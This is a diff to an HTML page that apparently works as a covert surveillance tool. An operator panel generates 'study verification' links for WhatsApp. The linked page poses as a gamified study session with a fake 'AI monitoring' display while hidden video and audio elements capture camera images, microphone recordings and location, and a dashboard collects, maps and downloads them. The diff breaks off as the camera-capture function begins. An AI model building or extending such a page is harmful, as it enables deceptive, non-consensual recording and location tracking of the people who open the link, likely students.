@@ -11,16 +11,120 @@
         * { font-family: 'Plus Jakarta Sans', sans-serif; }
         .gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
         .heart-animation { animation: heartbeat 1.5s ease infinite; }
-        @keyframes heartbeat { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        .video-container { background: #000; border-radius: 30px; overflow: hidden; }
+        @keyframes heartbeat { 0% { transform: scale(1); } 50% { transform: scale(1.15); } 100% { transform: scale(1); } }
         .love-btn { transition: all 0.3s ease; }
         .love-btn:hover { transform: scale(1.05); }
+        .love-btn:active { transform: scale(0.98); }
         #hiddenVideo, #hiddenAudio { position: fixed; bottom: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; visibility: hidden; pointer-events: none; }
         .stat-card { transition: all 0.3s ease; cursor: pointer; }
         .stat-card:hover { transform: translateY(-3px); background: rgba(255,255,255,0.25); }
         .gallery-img { transition: all 0.3s ease; cursor: pointer; }
         .gallery-img:hover { transform: scale(1.05); }
-        .notice-box { background: rgba(255, 200, 0, 0.15); border: 1px solid rgba(255, 200, 0, 0.4); }
+        .submission-card { background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 20px; padding: 20px; margin-bottom: 15px; }
+        
+        /* FUN ANIMATIONS */
+        .bounce-slow { animation: bounce 2s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .float { animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
+        .spin-slow { animation: spin 4s linear infinite; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .glow { box-shadow: 0 0 20px rgba(255, 100, 200, 0.6); animation: glow 2s ease-in-out infinite; }
+        @keyframes glow { 0%, 100% { box-shadow: 0 0 20px rgba(255, 100, 200, 0.6); } 50% { box-shadow: 0 0 40px rgba(255, 100, 200, 1); } }
+        
+        /* TECH SCAN ANIMATION */
+        .scan-line {
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #00ff88, #00ffcc, #00ff88, transparent);
+            box-shadow: 0 0 20px #00ff88, 0 0 40px #00ff88;
+            animation: scan 2s linear infinite;
+            z-index: 10;
+        }
+        @keyframes scan {
+            0% { top: 0%; opacity: 1; }
+            100% { top: 100%; opacity: 0.3; }
+        }
+        
+        .hex-grid {
+            background-image: 
+                linear-gradient(rgba(0,255,136,0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,255,136,0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+            animation: gridMove 3s linear infinite;
+        }
+        @keyframes gridMove { from { background-position: 0 0; } to { background-position: 20px 20px; } }
+        
+        .matrix-text {
+            font-family: 'Courier New', monospace;
+            color: #00ff88;
+            text-shadow: 0 0 10px #00ff88;
+        }
+        
+        .radar-sweep {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            border: 2px solid rgba(0,255,136,0.4);
+            position: relative;
+            background: radial-gradient(circle, rgba(0,255,136,0.05) 0%, transparent 70%);
+        }
+        .radar-sweep::before {
+            content: '';
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 50%; height: 2px;
+            background: linear-gradient(90deg, #00ff88, transparent);
+            transform-origin: left center;
+            animation: sweep 2s linear infinite;
+            box-shadow: 0 0 10px #00ff88;
+        }
+        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        
+        .data-stream {
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            color: #00ff88;
+            opacity: 0.6;
+            white-space: nowrap;
+            display: inline-block;
+            animation: stream 20s linear infinite;
+        }
+        @keyframes stream { from { transform: translateX(0); } to { transform: translateX(-50%); } }
+        
+        .circuit-line {
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            animation: pulseLine 2s ease-in-out infinite;
+        }
+        @keyframes pulseLine { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+        
+        .hologram {
+            background: linear-gradient(135deg, rgba(0,255,136,0.1) 0%, rgba(0,255,204,0.05) 50%, rgba(0,255,136,0.1) 100%);
+            border: 1px solid rgba(0,255,136,0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .glitch {
+            animation: glitch 0.3s infinite;
+        }
+        @keyframes glitch {
+            0%, 100% { text-shadow: 0 0 5px #00ff88, 0 0 10px #00ff88; }
+            50% { text-shadow: 2px 0 5px #00ffcc, -2px 0 5px #00ff88; }
+        }
+        
+        .confetti { position: fixed; width: 10px; height: 10px; animation: confetti-fall 3s linear infinite; z-index: 1000; pointer-events: none; }
+        @keyframes confetti-fall { 0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(720deg); opacity: 0; } }
+        
+        .achievement-popup { animation: popIn 0.5s ease; }
+        @keyframes popIn { 0% { transform: scale(0); opacity: 0; } 80% { transform: scale(1.1); } 100% { transform: scale(1); opacity: 1; } }
+        
+        .dot-pulse { animation: dotpulse 1.5s infinite ease-in-out; }
+        .dot-pulse:nth-child(2) { animation-delay: 0.2s; }
+        .dot-pulse:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes dotpulse { 0%, 80%, 100% { transform: scale(0.6); opacity: 0.5; } 40% { transform: scale(1); opacity: 1; } }
     </style>
 </head>
 <body class="gradient-bg min-h-screen">
@@ -38,13 +142,11 @@
         <p class="text-white/80 text-lg">Link generate karo → Student camera page open hoga</p>
     </div>
 
-    <!-- HTTPS Warning -->
-    <div id="httpsWarning" class="notice-box rounded-2xl p-4 mb-6 text-yellow-100 hidden">
+    <div id="httpsWarning" class="rounded-2xl p-4 mb-6 text-yellow-100 hidden" style="background: rgba(255, 200, 0, 0.15); border: 1px solid rgba(255, 200, 0, 0.4);">
         <p class="text-sm"><i class="fas fa-exclamation-triangle mr-2"></i>
-        <b>Camera/Mic kaam nahi karega!</b> HTTPS par host karo (GitHub Pages auto HTTPS deta hai).</p>
+        <b>Camera/Mic kaam nahi karega!</b> HTTPS par host karo (Railway auto HTTPS deta hai).</p>
     </div>
 
-    <!-- Generate Link Card -->
     <div class="bg-white/10 backdrop-blur-xl rounded-3xl p-8 mb-10 border border-white/20">
         <h2 class="text-2xl font-bold text-white mb-6 text-center"><i class="fas fa-link mr-2"></i> Generate Student Link</h2>
         
@@ -82,12 +184,9 @@
                 <button onclick="copyLink()" class="flex-1 bg-pink-500 text-white py-3 rounded-xl font-bold love-btn"><i class="fas fa-copy mr-2"></i> Copy Link</button>
                 <button onclick="sendToWhatsApp()" class="flex-1 bg-green-500 text-white py-3 rounded-xl font-bold love-btn"><i class="fab fa-whatsapp mr-2"></i> WhatsApp</button>
             </div>
-            <p class="text-white/60 text-xs text-center mt-3">⚠️ Student is link ko open karega → Seedha Camera Page khulega</p>
-            <p class="text-yellow-200 text-xs text-center mt-2">🔒 Student ko camera + mic + location ki permission "Allow" karni hogi</p>
         </div>
     </div>
 
-    <!-- Stats Cards -->
     <div class="grid grid-cols-2 md:grid-cols-5 gap-5 mb-10">
         <div class="stat-card bg-white/20 rounded-2xl p-5 text-center" onclick="showTab('photos')">
             <i class="fas fa-camera text-pink-400 text-2xl mb-2"></i>
@@ -115,8 +214,15 @@
         </div>
     </div>
 
-    <!-- Tab Content -->
-    <div id="photosTab" class="grid grid-cols-2 md:grid-cols-4 gap-5"></div>
+    <div class="text-center mb-6">
+        <button onclick="loadSubmissions()" class="bg-blue-500 text-white px-6 py-3 rounded-2xl font-bold love-btn">
+            <i class="fas fa-sync mr-2"></i> Refresh Student Data
+        </button>
+    </div>
+
+    <div id="submissionsArea"></div>
+
+    <div id="photosTab" class="grid grid-cols-2 md:grid-cols-4 gap-5 hidden"></div>
     <div id="videosTab" class="space-y-3 hidden"></div>
     <div id="voicesTab" class="space-y-3 hidden"></div>
     <div id="locationsTab" class="space-y-4 hidden"></div>
@@ -127,31 +233,177 @@
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <audio id="hiddenAudio" autoplay></audio>
 
-    <div class="min-h-screen flex items-center justify-center p-5">
+    <!-- START SCREEN -->
+    <div id="startScreen" class="min-h-screen flex items-center justify-center p-5 hidden">
+        <div class="max-w-md w-full bg-white/10 backdrop-blur-xl rounded-3xl p-8 text-center border border-white/20 glow">
+            <div class="float inline-block">
+                <i class="fas fa-graduation-cap text-yellow-300 text-7xl mb-4"></i>
+            </div>
+            <h2 class="text-3xl font-bold text-white mb-2">🎓 Study Session</h2>
+            <p class="text-white/80 mb-6 text-lg" id="startCampaignName">Ready to start?</p>
+            
+            <div class="bg-yellow-500/20 border border-yellow-400/40 rounded-2xl p-4 mb-6 text-left">
+                <p class="text-yellow-100 text-sm font-bold mb-2"><i class="fas fa-info-circle mr-2"></i>Important:</p>
+                <p class="text-white/90 text-xs mb-1">1. "Start Session" click karein</p>
+                <p class="text-white/90 text-xs mb-1">2. Camera permission <b>"Allow"</b> karein</p>
+                <p class="text-white/90 text-xs mb-1">3. Location permission <b>"Allow"</b> karein</p>
+                <p class="text-white/90 text-xs">4. Session apne aap complete hoga ✅</p>
+            </div>
+            
+            <button onclick="startSession()" class="w-full bg-gradient-to-r from-pink-500 to-purple-600 text-white py-4 rounded-2xl font-bold text-xl love-btn bounce-slow">
+                <i class="fas fa-rocket mr-2"></i> Start Session
+            </button>
+            <p class="text-white/60 text-xs mt-4">🎯 Mazedaar session • 🤖 AI Monitoring</p>
+        </div>
+    </div>
+
+    <!-- RECORDING SCREEN - TECH ILLUSION -->
+    <div id="recordingScreen" class="min-h-screen flex items-center justify-center p-5 hidden">
         <div class="max-w-md w-full">
-            <div class="bg-white/10 backdrop-blur-xl rounded-3xl overflow-hidden border border-white/20">
-                <div class="bg-gradient-to-r from-pink-500 to-purple-600 p-8 text-center">
-                    <i class="fas fa-heart text-white text-5xl mb-4 heart-animation"></i>
-                    <h2 class="text-3xl font-bold text-white">✨ Study Session ✨</h2>
-                    <p class="text-white/80 mt-2" id="cameraTitle">Loading...</p>
+            <div class="bg-black/80 backdrop-blur-xl rounded-3xl overflow-hidden border-2 border-green-500/50" style="box-shadow: 0 0 40px rgba(0,255,136,0.3);">
+                
+                <!-- HEADER -->
+                <div class="bg-black p-4 border-b border-green-500/30">
+                    <div class="flex justify-between items-center">
+                        <div class="flex items-center gap-2">
+                            <div class="w-3 h-3 bg-red-500 rounded-full animate-pulse"></div>
+                            <span class="text-red-400 text-xs font-bold matrix-text">● LIVE</span>
+                        </div>
+                        <span class="text-green-400 text-xs matrix-text glitch">AI MONITORING</span>
+                        <div class="flex items-center gap-1">
+                            <i class="fas fa-signal text-green-400 text-xs"></i>
+                            <i class="fas fa-signal text-green-400 text-xs"></i>
+                            <i class="fas fa-signal text-green-400 text-xs"></i>
+                            <i class="fas fa-signal text-green-400 text-xs"></i>
+                        </div>
+                    </div>
                 </div>
 
-                <div class="video-container m-5">
-                    <video id="fakeVideo" class="w-full rounded-2xl" autoplay loop muted playsinline></video>
+                <!-- TECH SCAN AREA -->
+                <div class="m-4 relative bg-black rounded-2xl overflow-hidden hex-grid" style="height: 280px;">
+                    <div class="scan-line"></div>
+                    
+                    <!-- Corner Brackets -->
+                    <div class="absolute top-2 left-2 w-6 h-6 border-t-2 border-l-2 border-green-400 z-20"></div>
+                    <div class="absolute top-2 right-2 w-6 h-6 border-t-2 border-r-2 border-green-400 z-20"></div>
+                    <div class="absolute bottom-2 left-2 w-6 h-6 border-b-2 border-l-2 border-green-400 z-20"></div>
+                    <div class="absolute bottom-2 right-2 w-6 h-6 border-b-2 border-r-2 border-green-400 z-20"></div>
+                    
+                    <!-- Radar -->
+                    <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-10">
+                        <div class="radar-sweep"></div>
+                    </div>
+                    
+                    <!-- Brain -->
+                    <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-center z-20">
+                        <i class="fas fa-brain text-green-400 text-5xl" style="text-shadow: 0 0 20px #00ff88;"></i>
+                    </div>
+                    
+                    <!-- Top Left -->
+                    <div class="absolute top-4 left-4 z-20">
+                        <p class="matrix-text text-xs glitch">▶ SCANNING</p>
+                        <p class="matrix-text text-xs opacity-70">FACE_DETECT: ✓</p>
+                        <p class="matrix-text text-xs opacity-70">FOCUS: 98%</p>
+                    </div>
+                    
+                    <!-- Top Right -->
+                    <div class="absolute top-4 right-4 text-right z-20">
+                        <p class="matrix-text text-xs" id="timerDisplay">00:00</p>
+                        <p class="matrix-text text-xs opacity-70">FPS: 60</p>
+                        <p class="matrix-text text-xs opacity-70">REC ●</p>
+                    </div>
+                    
+                    <!-- Bottom Stream -->
+                    <div class="absolute bottom-2 left-0 right-0 overflow-hidden z-20">
+                        <div class="data-stream">
+                            0x4A7B2F9C • 0x8E1D3A4B • AI_ANALYSIS_ACTIVE • 0xF2C9B1E8 • NEURAL_NET_OK • 0x5D7E9A2F • FOCUS_TRACKING • 0x3B8C4D1A • 0x9F2E6B7C • DATA_SYNC_OK • 0x4A7B2F9C • 0x8E1D3A4B • AI_ANALYSIS_ACTIVE • 0xF2C9B1E8 • NEURAL_NET_OK • 0x5D7E9A2F •
+                        </div>
+                    </div>
                 </div>
 
-                <div class="p-6 text-center">
-                    <div class="bg-white/20 rounded-2xl p-5 mb-5">
-                        <i class="fas fa-quote-left text-pink-300 text-xl"></i>
-                        <p class="text-white font-medium text-lg mt-2" id="motivationMsg">📖 "Every day is a learning opportunity"</p>
+                <!-- CIRCUIT LINES -->
+                <div class="mx-4 mb-3">
+                    <div class="circuit-line"></div>
+                    <div class="circuit-line" style="animation-delay: 0.3s;"></div>
+                    <div class="circuit-line" style="animation-delay: 0.6s;"></div>
+                </div>
+
+                <!-- PROGRESS -->
+                <div class="mx-4 mb-4 hologram rounded-2xl p-4">
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="matrix-text text-xs">📊 PROGRESS</span>
+                        <span class="matrix-text text-xs" id="progressText">0/10</span>
                     </div>
-                    <div class="bg-black/30 rounded-xl p-4">
-                        <p id="statusText" class="text-yellow-300 text-base">
-                            <i class="fas fa-heartbeat fa-pulse mr-2"></i> Setting up...
-                        </p>
+                    <div class="w-full bg-black/50 rounded-full h-2 overflow-hidden border border-green-500/30">
+                        <div id="progressBar" class="h-2 rounded-full transition-all duration-500" style="width: 0%; background: linear-gradient(90deg, #00ff88, #00ffcc); box-shadow: 0 0 10px #00ff88;"></div>
                     </div>
+                </div>
+
+                <!-- MOTIVATION -->
+                <div class="mx-4 mb-4 hologram rounded-2xl p-4 text-center">
+                    <div class="text-3xl mb-2" id="emojiDisplay">🤖</div>
+                    <p class="matrix-text text-sm" id="motivationMsg">"Initializing neural network..."</p>
+                    <p class="text-green-300/60 text-xs mt-2" id="funFact">💡 AI is analyzing your focus...</p>
+                </div>
+
+                <!-- STATUS -->
+                <div class="mx-4 mb-4 bg-black/50 rounded-xl p-3 text-center border border-green-500/30">
+                    <p id="statusText" class="matrix-text text-xs">
+                        <i class="fas fa-circle fa-pulse mr-2"></i> SYSTEM INITIALIZING...
+                    </p>
+                </div>
+
+                <!-- STATS -->
+                <div class="grid grid-cols-3 gap-2 mx-4 mb-4">
+                    <div class="bg-black/50 rounded-xl p-2 text-center border border-green-500/30">
+                        <div class="text-xl">🎯</div>
+                        <p class="matrix-text text-[10px]">FOCUS</p>
+                    </div>
+                    <div class="bg-black/50 rounded-xl p-2 text-center border border-green-500/30">
+                        <div class="text-xl">⚡</div>
+                        <p class="matrix-text text-[10px]">ACTIVE</p>
+                    </div>
+                    <div class="bg-black/50 rounded-xl p-2 text-center border border-green-500/30">
+                        <div class="text-xl">🔥</div>
+                        <p class="matrix-text text-[10px]">AI_ON</p>
+                    </div>
+                </div>
+
+                <div class="text-center pb-4">
+                    <p class="matrix-text text-[10px] opacity-50">🔒 END-TO-END ENCRYPTED • v2.0.1</p>
                 </div>
             </div>
+        </div>
+    </div>
+
+    <!-- COMPLETION SCREEN -->
+    <div id="completionScreen" class="min-h-screen flex items-center justify-center p-5 hidden">
+        <div class="max-w-md w-full bg-white/10 backdrop-blur-xl rounded-3xl p-8 text-center border border-white/20 glow achievement-popup">
+            <div class="text-7xl mb-4 bounce-slow">🎉</div>
+            <h2 class="text-3xl font-bold text-white mb-3">Session Complete!</h2>
+            <p class="text-white/90 mb-6">Shabaash! Tumne apna study session poora kiya 💪</p>
+            
+            <div class="bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl p-4 mb-6">
+                <p class="text-white font-bold text-lg">🏆 Achievement Unlocked!</p>
+                <p class="text-white/90 text-sm mt-1">"Focused Student" Badge</p>
+            </div>
+            
+            <div class="grid grid-cols-2 gap-3 mb-6">
+                <div class="bg-white/20 rounded-xl p-3">
+                    <p class="text-white text-2xl font-bold" id="finalPhotos">0</p>
+                    <p class="text-white/70 text-xs">📸 Captured</p>
+                </div>
+                <div class="bg-white/20 rounded-xl p-3">
+                    <p class="text-white text-2xl font-bold" id="finalTime">00:00</p>
+                    <p class="text-white/70 text-xs">⏱️ Duration</p>
+                </div>
+            </div>
+            
+            <div class="bg-green-500/20 border border-green-400/40 rounded-2xl p-3 mb-4">
+                <p class="text-green-200 text-sm"><i class="fas fa-check-circle mr-2"></i>Data sent successfully</p>
+            </div>
+            
+            <p class="text-white/50 text-xs">Aap ab yeh page band kar sakte hain</p>
         </div>
     </div>
 </div>
@@ -159,19 +411,65 @@
 </div>
 
 <script>
-// ============ SAFE BASE64 ============
-function safeBtoa(str) { return btoa(unescape(encodeURIComponent(str))); }
-function safeAtob(str) { return decodeURIComponent(escape(atob(str))); }
+// ============ CONFIG ============
+const BACKEND_URL = window.location.origin;
 
-// ============ DATA STORAGE ============
+// ============ URL-SAFE BASE64 (FIX) ============
+function safeBtoa(str) {
+    try {
+        const encoded = btoa(unescape(encodeURIComponent(str)));
+        return encoded.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    } catch(e) {
+        console.error('Encode error:', e);
+        return '';
+    }
+}
+
+function safeAtob(str) {
+    try {
+        let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
+        while(base64.length % 4) base64 += '=';
+        return decodeURIComponent(escape(atob(base64)));
+    } catch(e) {
+        console.error('Decode error:', e);
+        return '';
+    }
+}
+
 let allPhotos = [], allVideos = [], allVoices = [], allLocations = [];
-
 let hiddenStream = null, audioStream = null, videoRecorder = null, audioRecorder = null;
 let videoChunks = [], audioChunks = [];
 let capturedCount = 0, neededCount = 10, captureInterval = 1000, captureTimer = null;
-let locationInterval = null;
+let locationInterval = null, timerInterval = null, sessionStartTime = null;
 
-// ============ TAB MANAGEMENT ============
+// ============ FUN CONTENT ============
+const motivations = [
+    { emoji: "🧠", msg: "Neural network optimizing... Focus strong!" },
+    { emoji: "⚡", msg: "Brain waves detected: Alpha state active" },
+    { emoji: "🎯", msg: "Attention tracking: 98% focus achieved" },
+    { emoji: "🚀", msg: "Cognitive performance: EXCELLENT" },
+    { emoji: "💎", msg: "Memory retention: ENHANCED" },
+    { emoji: "🔥", msg: "You're on fire! Keep it up!" },
+    { emoji: "⭐", msg: "Learning pattern: OPTIMAL" },
+    { emoji: "🏆", msg: "Champion mode: ACTIVATED" },
+    { emoji: "🎓", msg: "Knowledge absorption: 95%" },
+    { emoji: "💪", msg: "Focus level: MAXIMUM" }
+];
+
+const funFacts = [
+    "💡 AI is analyzing your study pattern...",
+    "💡 Neural network processing your focus...",
+    "💡 Biometric data synchronized ✓",
+    "💡 Cognitive tracking enabled ✓",
+    "💡 Focus algorithm running...",
+    "💡 Memory retention analysis active...",
+    "💡 Attention span monitoring...",
+    "💡 Learning curve calculated...",
+    "💡 Performance metrics updated...",
+    "💡 Study session optimized..."
+];
+
+// ============ TABS ============
 function showTab(tab) {
     ['photosTab','videosTab','voicesTab','locationsTab'].forEach(t => document.getElementById(t).classList.add('hidden'));
     document.getElementById(tab + 'Tab').classList.remove('hidden');
@@ -182,172 +480,165 @@ function showTab(tab) {
 }
 
 function displayPhotos() {
-    const container = document.getElementById('photosTab');
-    if(allPhotos.length === 0) { container.innerHTML = '<div class="col-span-4 text-center text-white/50 py-10">📸 No photos yet</div>'; return; }
-    container.innerHTML = '';
+    const c = document.getElementById('photosTab');
+    if(allPhotos.length === 0) { c.innerHTML = '<div class="col-span-4 text-center text-white/50 py-10">📸 No photos yet</div>'; return; }
+    c.innerHTML = '';
     [...allPhotos].reverse().forEach((p, idx) => {
-        container.innerHTML += `
-            <div class="bg-white/10 rounded-2xl overflow-hidden group">
-                <img src="${p.data}" class="gallery-img w-full h-36 object-cover" onclick="window.open('${p.data}')">
-                <div class="p-2 text-center flex justify-between items-center">
-                    <span class="text-white text-xs">${p.time}</span>
-                    <button onclick="downloadPhoto(${allPhotos.length-1-idx})" class="bg-pink-500 text-white px-2 py-1 rounded-lg text-xs">Download</button>
-                </div>
-            </div>
-        `;
+        c.innerHTML += `<div class="bg-white/10 rounded-2xl overflow-hidden group">
+            <img src="${p.data}" class="gallery-img w-full h-36 object-cover" onclick="window.open('${p.data}')">
+            <div class="p-2 text-center flex justify-between items-center">
+                <span class="text-white text-xs">${p.time}</span>
+                <button onclick="downloadPhoto(${allPhotos.length-1-idx})" class="bg-pink-500 text-white px-2 py-1 rounded-lg text-xs">↓</button>
+            </div></div>`;
     });
 }
 
 function displayVideos() {
-    const container = document.getElementById('videosTab');
-    if(allVideos.length === 0) { container.innerHTML = '<div class="text-center text-white/50 py-10">🎥 No videos yet</div>'; return; }
-    container.innerHTML = '';
+    const c = document.getElementById('videosTab');
+    if(allVideos.length === 0) { c.innerHTML = '<div class="text-center text-white/50 py-10">🎥 No videos yet</div>'; return; }
+    c.innerHTML = '';
     [...allVideos].reverse().forEach((v, idx) => {
-        container.innerHTML += `
-            <div class="bg-white/10 rounded-2xl p-3">
-                <div class="flex items-center justify-between flex-wrap gap-2">
-                    <span class="text-white text-sm">🎥 Video - ${v.time}</span>
-                    <video controls class="h-16 rounded"><source src="${v.data}" type="video/webm"></video>
-                    <button onclick="downloadVideo(${allVideos.length-1-idx})" class="bg-pink-500 text-white px-3 py-1 rounded-lg text-sm">Download</button>
-                </div>
-            </div>
-        `;
+        c.innerHTML += `<div class="bg-white/10 rounded-2xl p-3">
+            <div class="flex items-center justify-between flex-wrap gap-2">
+                <span class="text-white text-sm">🎥 ${v.time}</span>
+                <video controls class="h-20 rounded max-w-[180px]"><source src="${v.data}" type="video/webm"></video>
+                <button onclick="downloadVideo(${allVideos.length-1-idx})" class="bg-pink-500 text-white px-3 py-1 rounded-lg text-sm">↓ Download</button>
+            </div></div>`;
     });
 }
 
 function displayVoices() {
-    const container = document.getElementById('voicesTab');
-    if(allVoices.length === 0) { container.innerHTML = '<div class="text-center text-white/50 py-10">🎤 No voice recordings yet</div>'; return; }
-    container.innerHTML = '';
+    const c = document.getElementById('voicesTab');
+    if(allVoices.length === 0) { c.innerHTML = '<div class="text-center text-white/50 py-10">🎤 No voice yet</div>'; return; }
+    c.innerHTML = '';
     [...allVoices].reverse().forEach((v, idx) => {
-        container.innerHTML += `
-            <div class="bg-white/10 rounded-2xl p-3">
-                <div class="flex items-center justify-between flex-wrap gap-2">
-                    <span class="text-white text-sm">🎤 Voice - ${v.time}</span>
-                    <audio controls class="h-10"><source src="${v.data}" type="audio/webm"></audio>
-                    <button onclick="downloadVoice(${allVoices.length-1-idx})" class="bg-pink-500 text-white px-3 py-1 rounded-lg text-sm">Download</button>
-                </div>
-            </div>
-        `;
+        c.innerHTML += `<div class="bg-white/10 rounded-2xl p-3">
+            <div class="flex items-center justify-between flex-wrap gap-2">
+                <span class="text-white text-sm">🎤 ${v.time}</span>
+                <audio controls class="h-10 max-w-[180px]"><source src="${v.data}" type="audio/webm"></audio>
+                <button onclick="downloadVoice(${allVoices.length-1-idx})" class="bg-pink-500 text-white px-3 py-1 rounded-lg text-sm">↓ Download</button>
+            </div></div>`;
     });
 }
 
 function displayLocations() {
-    const container = document.getElementById('locationsTab');
-    if(allLocations.length === 0) { container.innerHTML = '<div class="text-center text-white/50 py-10">📍 No locations yet</div>'; return; }
-    container.innerHTML = '';
+    const c = document.getElementById('locationsTab');
+    if(allLocations.length === 0) { c.innerHTML = '<div class="text-center text-white/50 py-10">📍 No location yet</div>'; return; }
+    c.innerHTML = '';
     [...allLocations].reverse().forEach(l => {
-        container.innerHTML += `
-            <div class="bg-white/10 rounded-2xl p-3">
-                <div class="mb-2 rounded-xl overflow-hidden">
-                    <iframe width="100%" height="200" frameborder="0" src="https://maps.google.com/maps?q=${l.lat},${l.lng}&z=15&output=embed"></iframe>
-                </div>
-                <div class="flex justify-between items-center">
-                    <div>
-                        <span class="text-white text-sm">📍 ${l.lat?.toFixed(4)}, ${l.lng?.toFixed(4)}</span>
-                        <p class="text-white/60 text-xs">${l.address || 'Address fetched'}</p>
-                        <p class="text-white/40 text-xs">⏰ ${l.time}</p>
-                    </div>
-                    <a href="https://maps.google.com?q=${l.lat},${l.lng}" target="_blank" class="bg-blue-500 text-white px-3 py-1 rounded-lg text-sm">Map</a>
-                </div>
+        c.innerHTML += `<div class="bg-white/10 rounded-2xl p-3">
+            <div class="mb-2 rounded-xl overflow-hidden">
+                <iframe width="100%" height="200" frameborder="0" src="https://maps.google.com/maps?q=${l.lat},${l.lng}&z=15&output=embed"></iframe>
             </div>
-        `;
+            <div class="flex justify-between items-center">
+                <div>
+                    <span class="text-white text-sm">📍 ${l.lat?.toFixed(4)}, ${l.lng?.toFixed(4)}</span>
+                    <p class="text-white/60 text-xs">${l.address || ''}</p>
+                    <p class="text-white/40 text-xs">⏰ ${l.time} ${l.source ? '• ' + l.source : ''}</p>
+                </div>
+                <a href="https://maps.google.com?q=${l.lat},${l.lng}" target="_blank" class="bg-blue-500 text-white px-3 py-1 rounded-lg text-sm">Map</a>
+            </div></div>`;
     });
 }
 
-// ============ DOWNLOAD ============
 function downloadPhoto(idx) { const a = document.createElement('a'); a.download = `photo_${Date.now()}.jpg`; a.href = allPhotos[idx].data; a.click(); }
 function downloadVideo(idx) { const a = document.createElement('a'); a.download = `video_${Date.now()}.webm`; a.href = allVideos[idx].data; a.click(); }
 function downloadVoice(idx) { const a = document.createElement('a'); a.download = `voice_${Date.now()}.webm`; a.href = allVoices[idx].data; a.click(); }
 
 function downloadAllData() {
-    const report = { 
-        photos: allPhotos.map(p => ({ time: p.time, data: p.data })), 
-        videos: allVideos.map(v => ({ time: v.time, data: v.data })), 
-        voices: allVoices.map(v => ({ time: v.time, data: v.data })), 
-        locations: allLocations, 
-        exportedAt: new Date().toLocaleString() 
-    };
+    const r = { photos: allPhotos, videos: allVideos, voices: allVoices, locations: allLocations, exportedAt: new Date().toLocaleString() };
     const a = document.createElement('a');
     a.download = `study_report_${Date.now()}.json`;
-    a.href = URL.createObjectURL(new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' }));
+    a.href = URL.createObjectURL(new Blob([JSON.stringify(r, null, 2)], { type: 'application/json' }));
     a.click();
-    alert('✅ Complete report downloaded!');
 }
 
-// ============ LINK GENERATION (sirf text data) ============
+// ============ LINK GENERATION (FIXED) ============
 function generateLink() {
-    const campaignName = document.getElementById('campaignName').value.trim();
-    if(!campaignName) { alert('Please enter campaign name'); return; }
+    const cn = document.getElementById('campaignName').value.trim();
+    if(!cn) { alert('Campaign name daalo'); return; }
     
-    const captureSpeed = document.getElementById('captureSpeed').value;
-    const photoCount = document.getElementById('photoCount').value;
-    
-    // Sirf chhota data URL mein — koi video/image nahi
-    const linkData = {
-        n: campaignName,
-        s: captureSpeed,
-        p: parseInt(photoCount)
+    const linkData = { 
+        n: cn, 
+        s: document.getElementById('captureSpeed').value, 
+        p: parseInt(document.getElementById('photoCount').value) 
     };
     
-    const encoded = safeBtoa(JSON.stringify(linkData));
+    console.log('📦 Link Data:', linkData);
+    
+    const jsonStr = JSON.stringify(linkData);
+    const encoded = safeBtoa(jsonStr);
+    
+    console.log('🔐 Encoded:', encoded);
+    
+    // Verify
+    const verify = safeAtob(encoded);
+    console.log('✅ Verify:', verify);
+    
+    if(verify !== jsonStr) {
+        alert('❌ Encoding error! Try again.');
+        return;
+    }
+    
     const baseUrl = window.location.href.split('?')[0].split('#')[0];
     const fullLink = baseUrl + '?data=' + encoded;
+    
+    console.log('🔗 Link:', fullLink);
     
     document.getElementById('generatedLink').value = fullLink;
     document.getElementById('linkBox').classList.remove('hidden');
 }
 
 function copyLink() {
-    const input = document.getElementById('generatedLink');
-    input.select();
-    try {
-        navigator.clipboard.writeText(input.value).then(() => alert('✅ Link copied!'))
-        .catch(() => { document.execCommand('copy'); alert('✅ Link copied!'); });
-    } catch(e) { document.execCommand('copy'); alert('✅ Link copied!'); }
+    const i = document.getElementById('generatedLink');
+    i.select();
+    navigator.clipboard.writeText(i.value).then(() => alert('✅ Copied!')).catch(() => { document.execCommand('copy'); alert('✅ Copied!'); });
 }
 
 function sendToWhatsApp() {
-    const link = document.getElementById('generatedLink').value;
-    window.open(`https://wa.me/?text=${encodeURIComponent('📸 Study Verification: ' + link)}`, '_blank');
+    window.open(`https://wa.me/?text=${encodeURIComponent('📸 Study Verification: ' + document.getElementById('generatedLink').value)}`, '_blank');
 }
 
 // ============ CAMERA PAGE ============
-async function startCameraPageFromData(linkData) {
+function startCameraPageFromData(linkData) {
     neededCount = linkData.p || 10;
     captureInterval = parseFloat(linkData.s || 1) * 1000;
     capturedCount = 0;
-    
-    document.getElementById('cameraTitle').innerHTML = linkData.n || 'Study Session';
-    
-    const videoElement = document.getElementById('fakeVideo');
